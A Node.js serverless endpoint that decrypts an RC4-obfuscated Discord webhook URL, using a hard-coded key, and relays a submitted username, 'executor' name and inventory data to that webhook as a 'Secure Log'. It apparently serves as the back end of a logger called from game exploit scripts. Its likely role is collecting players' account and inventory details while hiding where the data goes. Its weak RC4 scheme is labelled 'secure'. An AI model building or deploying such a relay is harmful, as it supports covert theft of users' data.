const axios = require('axios');

function fromBase64(b64) {
    return Buffer.from(b64, 'base64').toString('binary');
}

function rc4Decrypt(text, key) {
    let s = [], j = 0, x;
    for (let i = 0; i < 256; i++) s[i] = i;
    for (let i = 0; i < 256; i++) {
        j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
        x = s[i]; s[i] = s[j]; s[j] = x;
    }
    let i = 0; j = 0; let res = '';
    for (let y = 0; y < text.length; y++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        x = s[i]; s[i] = s[j]; s[j] = x;
        res += String.fromCharCode(text.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
    }
    return res;
}

function secureDecrypt(base64Payload, masterKey) {
    try {
        const decoded = fromBase64(base64Payload);
        const separatorIndex = decoded.indexOf(":");
        if (separatorIndex === -1) return null;
        
        const salt = decoded.substring(0, separatorIndex);
        const encryptedText = decoded.substring(separatorIndex + 1);
        const combinedKey = masterKey + salt;
        
        return rc4Decrypt(encryptedText, combinedKey);
    } catch (e) {
        return null;
    }
}

module.exports = async (req, res) => {
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, executor, inventoryData, encryptedWebhook } = req.body;
    const masterKey = "BABA";

    const realWebhookUrl = secureDecrypt(encryptedWebhook, masterKey);

    if (!realWebhookUrl || !realWebhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        return res.status(400).json({ error: 'Invalid or manipulated payload' });
    }

    try {
        await axios.post(realWebhookUrl, {
            embeds: [{
                title: "🔒 Secure Log Received",
                color: 65280,
                fields: [
                    { name: "👤 User", value: `\`${username}\``, inline: true },
                    { name: "🚀 Executor", value: `\`${executor}\``, inline: true },
                    { name: "🎒 Inventory", value: `\`\`\`json\n${JSON.stringify(inventoryData)}\n\`\`\`` }
                ],
                timestamp: new Date()
            }]
        });

        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: 'Failed to forward to Discord' });
    }
};
